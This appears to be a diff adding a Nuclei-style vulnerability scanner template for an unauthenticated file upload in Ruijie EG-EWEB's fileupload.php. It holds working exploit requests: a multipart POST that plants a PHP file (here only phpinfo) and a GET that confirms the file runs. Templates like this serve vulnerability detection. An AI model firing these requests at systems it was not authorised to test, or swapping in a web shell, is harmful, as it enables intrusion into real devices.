@@ -1,0 +1,43 @@
+id: RuiJie-EWEB-fileupload-uploadToRCE
+
+info:
+  name: Ruijie EG-EWEB fileupload.php Arbitrary File Upload
+  author: iSee857
+  severity: critical
+  description: Ruijie EG-EWEB fileupload.php allows unauthenticated attackers to upload arbitrary files via path traversal, leading to remote code execution.
+  reference:
+    - https://github.com/iSee857
+  tags: ruijie,rce,file-upload
+
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/fileupload.php HTTP/1.1
+        Host: {{Host}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXarDTbMzZe2hdNu2
+
+        ------WebKitFormBoundaryXarDTbMzZe2hdNu2
+        Content-Disposition: form-data; name="uploadDir"
+
+        upload
+        ------WebKitFormBoundaryXarDTbMzZe2hdNu2
+        Content-Disposition: form-data; name="file";filename="123.php"
+
+        <?php phpinfo();?>
+        ------WebKitFormBoundaryXarDTbMzZe2hdNu2--
+
+      - |
+        GET /ddi/server/upload/123.php HTTP/1.1
+        Host: {{Host}}
+
+    matchers:
+      - type: word
+        words:
+          - "PHP Version"
+        part: body
+      
+      - type: status
+        status:
+          - 200
